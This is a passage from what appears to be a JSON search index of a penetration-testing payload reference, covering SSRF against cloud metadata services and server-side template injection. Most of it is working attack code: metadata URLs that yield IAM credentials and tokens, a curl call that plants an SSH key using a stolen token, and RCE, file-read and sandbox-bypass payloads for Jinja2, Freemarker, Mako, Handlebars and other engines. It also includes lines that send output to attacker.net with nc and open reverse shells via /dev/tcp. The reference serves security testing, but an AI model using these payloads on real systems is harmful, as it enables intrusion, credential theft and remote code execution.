ECS"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-elastic-beanstalk","text":"We retrieve the accountId and region from the API. http://169.254.169.254/latest/dynamic/instance-identity/document http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role We then retrieve the AccessKeyId , SecretAccessKey , and Token from the API. http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role Then we use the credentials with aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/ .","title":"SSRF URL for AWS Elastic Beanstalk"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-lambda","text":"AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment. http://localhost:9001/2018-06-01/runtime/invocation/next $ curl \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\" Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next","title":"SSRF URL for AWS Lambda"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-google-cloud","text":":warning: Google is shutting down support for usage of the v1 metadata service on January 15. Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\" http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true Required headers can be set using a gopher SSRF with the following technique gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a Interesting files to pull out: SSH Public Key : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json Get Access Token : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token Kubernetes Key : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json","title":"SSRF URL for Google Cloud"},{"location":"Server%20Side%20Request%20Forgery/#add-an-ssh-key","text":"Extract the token http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json Check the scope of the token $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA { \"issued_to\": \"101302079XXXXX\", \"audience\": \"10130207XXXXX\", \"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\", \"expires_in\": 2443, \"access_type\": \"offline\" } Now push the SSH key. curl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" -H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\" -H \"Content-Type: application/json\" --data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'","title":"Add an SSH key"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-digital-ocean","text":"Documentation available at https://developers.digitalocean.com/documentation/metadata/ curl http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address All in one request: curl http://169.254.169.254/metadata/v1.json | jq","title":"SSRF URL for Digital Ocean"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-packetcloud","text":"Documentation available at https://metadata.packet.net/userdata","title":"SSRF URL for Packetcloud"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-azure","text":"Limited, maybe more exists? https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ http://169.254.169.254/metadata/v1/maintenance Update Apr 2017, Azure has more support; requires the header \"Metadata: true\" https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text","title":"SSRF URL for Azure"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-openstackrackspace","text":"(header required? unknown) http://169.254.169.254/openstack","title":"SSRF URL for OpenStack/RackSpace"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-hp-helion","text":"(header required? unknown) http://169.254.169.254/2009-04-04/meta-data/","title":"SSRF URL for HP Helion"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-oracle-cloud","text":"http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/","title":"SSRF URL for Oracle Cloud"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-alibaba","text":"http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id","title":"SSRF URL for Alibaba"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-kubernetes-etcd","text":"Can contain API keys and internal ip and ports curl -L http://127.0.0.1:2379/version curl http://127.0.0.1:2379/v2/keys/?recursive=true","title":"SSRF URL for Kubernetes ETCD"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-docker","text":"http://127.0.0.1:2375/v1.24/containers/json Simple example docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json More info: Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option Docker Engine API: https://docs.docker.com/engine/api/latest/","title":"SSRF URL for Docker"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-rancher","text":"curl http://rancher-metadata/<version>/<path> More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/","title":"SSRF URL for Rancher"},{"location":"Server%20Side%20Request%20Forgery/#references","text":"AppSecEU15-Server_side_browsing_considered_harmful.pdf Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13 ESEA Server-Side Request Forgery and Querying AWS Meta Data by Brett Buerhaus SSRF and local file read in video to gif converter SSRF in https://imgur.com/vidgif/url SSRF in proxy.duckduckgo.com Blind SSRF on errors.hackerone.net SSRF on *shopifycloud.com Hackerone - How To: Server-Side Request Forgery (SSRF) Awesome URL abuse for SSRF by @orange_8361 #BHUSA How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai #HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai SSRF Tips - xl7dev SSRF in https://imgur.com/vidgif/url Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat AppSecEU15 Server side browsing considered harmful - @Agarri Enclosed alphanumerics - @EdOverflow Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity PHP SSRF @secjuice How I convert SSRF to xss in a ssrf vulnerable Jira Piercing the Veil: Server Side Request Forgery to NIPRNet access Hacker101 SSRF SSRF\u8106\u5f31\u6027\u3092\u5229\u7528\u3057\u305fGCE/GKE\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3078\u306e\u653b\u6483\u4f8b SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019 SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure PortSwigger - Web Security Academy Server-side request forgery (SSRF) SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019 SSRF\u2019s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019 challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE! Attacking Url's in JAVA","title":"References"},{"location":"Server%20Side%20Template%20Injection/","text":"Templates Injections Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages Summary Templates Injections Summary Tools Methodology ASP.NET Razor ASP.NET Razor - Basic injection ASP.NET Razor - Command execution Expression Language EL Expression Language EL - Basic injection Expression Language EL - One-Liner injections not including code execution Expression Language EL - Code Execution Freemarker Freemarker - Basic injection Freemarker - Read File Freemarker - Code execution Freemarker - Sandbox bypass Groovy Groovy - Basic injection Groovy - Read and create File Groovy - HTTP request: Groovy - Command Execution Groovy - Sandbox Bypass Handlebars Handlebars - Command Execution Jade / Codepen Java Java - Basic injection Java - Retrieve the system\u2019s environment variables Java - Retrieve /etc/passwd Django Template Jinja2 Jinja2 - Basic injection Jinja2 - Template format Jinja2 - Debug Statement Jinja2 - Dump all used classes Jinja2 - Dump all config variables Jinja2 - Read remote file Jinja2 - Write into remote file Jinja2 - Remote Code Execution Exploit the SSTI by calling os.popen().read() Exploit the SSTI by calling subprocess.Popen Exploit the SSTI by calling Popen without guessing the offset Exploit the SSTI by writing an evil config file. Jinja2 - Filter bypass Jinjava Jinjava - Basic injection Jinjava - Command execution Lessjs Lessjs - SSRF / LFI Lessjs < v3 - Command Execution Plugins Mako Direct access to os from TemplateNamespace: Pebble Pebble - Basic injection Pebble - Code execution Ruby Ruby - Basic injections Ruby - Retrieve /etc/passwd Ruby - List files and directories Ruby - Code execution Smarty Twig Twig - Basic injection Twig - Template format Twig - Arbitrary File Reading Twig - Code execution Velocity References Tools Recommended tool: Tplmap e.g: python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=*&comment=supercomment&link\" python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link\" --level 5 -e jade Methodology Detection In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability : ${{<%[%'\"}}%\\. ASP.NET Razor Official website Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages. ASP.NET Razor - Basic injection @(1+2) ASP.NET Razor - Command execution @{ // C# code } Expression Language EL Official website Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0 Expression Language EL - Basic injection ${1+1} #{1+1} Expression Language EL - One-Liner injections not including code execution // DNS Lookup ${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"xxxxxxxxxxxxxx.burpcollaborator.net\")} // JVM System Property Lookup (ex: java.class.path) ${\"\".getClass().forName(\"java.lang.System\").getDeclaredMethod(\"getProperty\",\"\".getClass()).invoke(\"\",\"java.class.path\")} Expression Language EL - Code Execution // Common RCE payloads ''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>) ''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start() // Method using Runtime #{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])} #{session.getAttribute(\"rtc\").setAccessible(true)} #{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")} // Method using process builder ${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())} ${request.getAttribute(\"c\").add(\"cmd.exe\")} ${request.getAttribute(\"c\").add(\"/k\")} ${request.getAttribute(\"c\").add(\"ping x.x.x.x\")} ${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())} ${request.getAttribute(\"a\")} // Method using Reflection & Invoke ${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")} // Method using ScriptEngineManager one-liner ${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))} // Method using ScriptEngineManager ${facesContext.getExternalContext().setResponseHeader(\"output\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\\\"var x=new java.lang.ProcessBuilder;x.command(\\\\\\\"wget\\\\\\\",\\\\\\\"http://x.x.x.x/1.sh\\\\\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\"))} Freemarker Official website Apache FreeMarker\u2122 is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. You can try your payloads at https://try.freemarker.apache.org Freemarker - Basic injection The template can be ${3*3} or the legacy #{3*3} . Freemarker - Read File ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")} Convert the returned bytes to ASCII Freemarker - Code execution <#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")} [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')} ${\"freemarker.template.utility.Execute\"?new()(\"id\")} Freemarker - Sandbox bypass :warning: only works on Freemarker versions below 2.3.30 <#assign classloader=article.class.protectionDomain.classLoader> <#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")> <#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)> <#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")> ${dwf.newInstance(ec,null)(\"id\")} Groovy Official website Groovy - Basic injection Refer to https://groovy-lang.org/syntax.html , but ${9*9} is the basic injection. Groovy - Read and create File ${String x = new File('c:/windows/notepad.exe').text} ${String x = new File('/path/to/file').getText('UTF-8')} ${new File(\"C:\\Temp\\FileName.txt\").createNewFile();} Groovy - HTTP request: ${\"http://www.google.com\".toURL().text} ${new URL(\"http://www.google.com\").getText()} Groovy - Command Execution ${\"calc.exe\".exec()} ${\"calc.exe\".execute()} ${this.evaluate(\"9*9\") //(this is a Script class)} ${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()} Groovy - Sandbox Bypass ${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")}) def x } or ${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") } Handlebars Official website Handlebars compiles templates into JavaScript functions. Handlebars - Command Execution {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').execSync('ls -la');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} Jade / Codepen Official website - var x = root.process - x = x.mainModule.require - x = x('child_process') = x.exec('id | nc attacker.net 80') #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout} Java Java - Basic injection Multiple variable expressions can be used, if ${...} doesn't work try #{...} , *{...} , @{...} or ~{...} . ${7*7} ${{7*7}} ${class.getClassLoader()} ${class.getResource(\"\").getPath()} ${class.getResource(\"../../../../../index.htm\").getContent()} Java - Retrieve the system\u2019s environment variables ${T(java.lang.System).getenv()} Java - Retrieve /etc/passwd ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')} ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} Django Templates Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2. Detection {% csrf_token %} # Causes error with Jinja2 {{ 7*7 }} # Error with Django Templates ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r Django Templates for post-exploitation # Variables {{ variable }} {{ variable.attr }} # Filters {{ value|length }} # Tags {% csrf_token %} Cross-site scripting {{ '<script>alert(3)</script>' }} {{ '<script>alert(3)</script>' | safe }} Debug information leak {% debug %} Leaking app\u2019s Secret Key {{ messages.storages.0.signer.key }} Admin Site URL leak {% include 'admin/base.html' %} Admin username and password hash leak {% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} Jinja2 Official website Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed. Jinja2 - Basic injection {{4*4}}[[5*5]] {{7*'7'}} would result in 7777777 {{config.items()}} Jinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on a Flask application. Jinja2 - Template format {% extends \"layout.html\" %} {% block body %} <ul> {% for user in users %} <li><a href=\"{{ user.url }}\">{{ user.username }}</a></li> {% endfor %} </ul> {% endblock %} Jinja2 - Debug Statement If the Debug Extension is enabled, a {% debug %} tag will be available to dump the current context as well as the available filters and tests. This is useful to see what\u2019s available to use in the template without setting up a debugger. <pre>{% debug %}</pre> Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement Jinja2 - Dump all used classes {{ [].class.base.subclasses() }} {{''.class.mro()[1].subclasses()}} {{ ''.__class__.__mro__[2].__subclasses__() }} Jinja2 - Dump all config variables {% for key, value in config.iteritems() %} <dt>{{ key|e }}</dt> <dd>{{ value|e }}</dd> {% endfor %} Jinja2 - Read remote file # ''.__class__.__mro__[2].__subclasses__()[40] = File class {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }} # https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398 {{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }} Jinja2 - Write into remote file {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }} Jinja2 - Remote Code Execution Listen for connection nc -lnvp 8000 Exploit the SSTI by calling os.popen().read() These payloads are context-free, and do not require anything, except being in a jinja2 Template object: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }} We can use these shorter payloads (this is the shorter payloads known yet): {{ cycler.__init__.__globals__.os.popen('id').read() }} {{ joiner.__init__.__globals__.os.popen('id').read() }} {{ namespace.__init__.__globals__.os.popen('id').read() }} Source @podalirius_ : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/ Exploit the SSTI by calling subprocess.Popen :warning: the number 396 will vary depending of the application. {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} Exploit the SSTI by calling Popen without guessing the offset {% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %} Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls) {% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%} Exploit the SSTI by writing an evil config file. # evil config {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }} # load the evil config {{ config.from_pyfile('/tmp/evilconfig.cfg') }} # connect to evil host {{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1\"',shell=True) }} Jinja2 - Filter bypass request.__class__ request[\"__class__\"] Bypassing _ http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_ {{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}} {{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}} {{request|attr([\"__\",\"class\",\"__\"]|join)}} {{request|attr(\"__class__\")}} {{request.__class__}} Bypassing [ and ] http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_ or http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_ Bypassing |join http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus: {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}} Jinjava Official website Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content). Jinjava - Basic injection {{'a'.toUpperCase()}} would result in 'A' {{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206 Jinjava is an open source project developed by Hubspot, available at https://github.com/HubSpot/jinjava/ Jinjava - Command execution Fixed by https://github.com/HubSpot/jinjava/pull/230 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} Lessjs Official website Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles. Lessjs - SSRF / LFI @import (inline) \"http://localhost\"; // or @import (inline) \"/etc/passwd\"; Lessjs < v3 - Command Execution body { color: `global.process.mainModule.require(\"child_process\").execSync(\"id\")`; } Plugins Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled. // example local plugin usage @plugin \"plugin-2.7.js\"; or // example remote plugin usage @plugin \"http://example.com/plugin-2.7.js\" version 2 example RCE plugin: functions.add('cmd', function(val) { return `\"${global.process.mainModule.require('child_process').execSync(val.value)}\"`; }); version 3 and above example RCE plugin //Vulnerable plugin (3.13.1) registerPlugin({ install: function(less, pluginManager, functions) { functions.add('cmd', function(val) { return global.process.mainModule.require('child_process').execSync(val.value).toString(); }); } }) Mako Official website Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics. <% import os x=os.popen('id').read() %> ${x} Direct access to os from TemplateNamespace: Any of these payloads allows direct access to the os module ${self.module.cache.util.os.system(\"id\")} ${self.module.runtime.util.os.system(\"id\")} ${self.template.module.cache.util.os.system(\"id\")} ${self.module.cache.compat.inspect.os.system(\"id\")} ${self.__init__.__globals__['util'].os.system('id')} ${self.template.module.runtime.util.os.system(\"id\")} ${self.module.filters.compat.inspect.os.system(\"id\")} ${self.module.runtime.compat.inspect.os.system(\"id\")} ${self.module.runtime.exceptions.util.os.system(\"id\")} ${self.template.__init__.__globals__['os'].system('id')} ${self.module.cache.util.compat.inspect.os.system(\"id\")} ${self.module.runtime.util.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.cache.util.os.system(\"id\")} ${self.template.module.cache.compat.inspect.os.system(\"id\")} ${self.module.cache.compat.inspect.linecache.os.system(\"id\")} ${self.template._mmarker.module.runtime.util.os.system(\"id\")} ${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")} ${self.template.module.filters.compat.inspect.os.system(\"id\")} ${self.template.module.runtime.compat.inspect.os.system(\"id\")} ${self.module.filters.compat.inspect.linecache.os.system(\"id\")} ${self.module.runtime.compat.inspect.linecache.os.system(\"id\")} ${self.template.module.runtime.exceptions.util.os.system(\"id\")} ${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")} ${self.context._with_template.module.cache.util.os.system(\"id\")} ${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")} ${self.template.module.cache.util.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.runtime.util.os.system(\"id\")} ${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")} ${self.template.module.runtime.util.compat.inspect.os.system(\"id\")} ${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")} ${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")} ${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")} ${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")} ${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")} ${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")} ${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")} ${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")} ${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")} ${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")} ${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")} ${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")} ${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")} ${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")} ${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")} ${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")} ${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")} ${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")} ${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")} PoC : >>> print(Template(\"${self.module.cache.util.os}\").render()) <module 'os' from '/usr/local/lib/python3.10/os.py'> Source @podalirius_ : https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/ Pebble Official website Pebble is a Java templating engine inspired by Twig and similar to the Python Jinja Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization. Pebble - Basic injection {{ someString.toUPPERCASE() }} Pebble - Code execution Old version of Pebble ( < version 3.0.9): {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }} . New version of Pebble : {% set cmd = 'id' %} {% set bytes = (1).TYPE .forName('java.lang.Runtime') .methods[6] .invoke(null,null) .exec(cmd) .inputStream .readAllBytes() %} {{ (1).TYPE .forName('java.lang.String') .constructors[0] .newInstance(([bytes]).toArray()) }} Ruby Ruby - Basic injections ERB: <%= 7 * 7 %> Slim: #{ 7 * 7 } Ruby - Retrieve /etc/passwd <%= File.open('/etc/passwd').read %> Ruby - List files and directories <%= Dir.entries('/') %> Ruby - Code execution Execute code using SSTI for ERB engine. <%= system('cat /etc/passwd') %> <%= `ls /` %> <%= IO.popen('ls /').readlines() %> <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%> <% require 'open4' %><% 